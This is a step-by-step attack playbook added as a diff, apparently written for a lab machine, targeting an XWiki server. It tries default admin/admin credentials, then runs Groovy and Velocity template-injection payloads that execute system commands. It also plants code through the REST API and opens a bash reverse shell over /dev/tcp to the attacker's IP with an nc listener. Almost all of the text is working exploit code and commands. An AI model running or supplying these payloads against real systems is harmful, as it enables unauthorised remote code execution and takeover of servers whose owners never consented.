@@ -1,0 +1,131 @@
+# TRY TEMPLATE INJECTION RIGHT NOW - Step by Step
+# Your IP: 10.10.15.201
+
+# ============================================
+# STEP 1: Check XWiki Status (2 min)
+# ============================================
+
+# Check if XWiki is accessible
+curl -s http://10.129.7.80:8080/xwiki/ | head -50
+
+# Check main page
+curl -s http://10.129.7.80:8080/xwiki/bin/view/Main/WebHome | head -50
+
+# ============================================
+# STEP 2: Try Authentication (5 min)
+# ============================================
+
+# Try admin/admin
+curl -s -X POST http://10.129.7.80:8080/xwiki/bin/login/XWiki/XWikiLogin \
+    -d "j_username=admin&j_password=admin" \
+    -L -c cookies.txt -o login.html
+
+# Check result
+cat login.html | grep -i "logout\|dashboard\|welcome\|error\|invalid" | head -5
+
+# If you see "logout" or "dashboard" - LOGIN SUCCESS!
+# If you see "error" or "invalid" - LOGIN FAILED
+
+# ============================================
+# STEP 3: Access XWiki in Browser (10 min) ⭐
+# ============================================
+
+# Open browser and go to:
+# http://10.129.7.80:8080/xwiki
+
+# Try these steps:
+
+# Option A: If login worked
+# 1. You should see dashboard
+# 2. Click "Create" or find "Edit" button
+# 3. Create a new page (name it "Test" or anything)
+
+# Option B: If login failed
+# 1. Try accessing without login
+# 2. Look for "Create" or "Edit" button
+# 3. Some XWiki instances allow anonymous editing
+
+# ============================================
+# STEP 4: Try Template Injection (15 min) ⭐⭐⭐
+# ============================================
+
+# Once you're in edit mode, paste this code:
+
+# TEST PAYLOAD (to see if it works):
+{{groovy}}
+def proc = 'whoami'.execute()
+proc.waitFor()
+println proc.text
+{{/groovy}}
+
+# Save the page and view it
+# If you see a username (like "xwiki" or "jenkins") - IT WORKS!
+
+# ============================================
+# STEP 5: Get Reverse Shell (20 min) ⭐⭐⭐
+# ============================================
+
+# FIRST: Set up listener in a NEW terminal window
+# Run this command:
+nc -lvp 4444
+
+# THEN: In the XWiki page, replace the test payload with:
+
+{{groovy}}
+def proc = 'bash -c "bash -i >& /dev/tcp/10.10.15.201/4444 0>&1"'.execute()
+proc.waitFor()
+{{/groovy}}
+
+# Save the page
+# You should get a reverse shell in your listener terminal!
+
+# ============================================
+# STEP 6: If Template Injection Doesn't Work
+# ============================================
+
+# Try Velocity template instead:
+#set($exec = $xwiki.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami'))
+#set($is = $exec.getInputStream())
+#foreach($i in [1..$is.available()])
+$is.read()
+#end
+
+# ============================================
+# STEP 7: Alternative - Try REST API (if authenticated)
+# ============================================
+
+# If you have cookies from login, try creating page via API:
+curl -s -b cookies.txt -X PUT \
+    "http://10.129.7.80:8080/xwiki/rest/wikis/xwiki/spaces/Main/pages/TestPage" \
+    -H "Content-Type: application/xml" \
+    -d '<?xml version="1.0" encoding="UTF-8"?><page><content>{{groovy}}def proc = "whoami".execute();proc.waitFor();println proc.text{{/groovy}}</content></page>'
+
+# ============================================
+# STEP 8: Document Everything
+# ============================================
+
+# Save all outputs
+cd ~/xwiki_attempts_*
+echo "=== Template Injection Attempt ===" >> summary.txt
+date >> summary.txt
+echo "IP: 10.10.15.201" >> summary.txt
+echo "Target: 10.129.7.80:8080" >> summary.txt
+echo "" >> summary.txt
+
+# Save login result
+cat login.html >> summary.txt 2>/dev/null
+
+# ============================================
+# QUICK CHECKLIST
+# ============================================
+
+# [ ] Checked XWiki status
+# [ ] Tried authentication
+# [ ] Opened XWiki in browser
+# [ ] Tried to create/edit page
+# [ ] Pasted template injection payload
+# [ ] Checked if command executed
+# [ ] Set up reverse shell listener
+# [ ] Tried reverse shell payload
+# [ ] Documented results
+
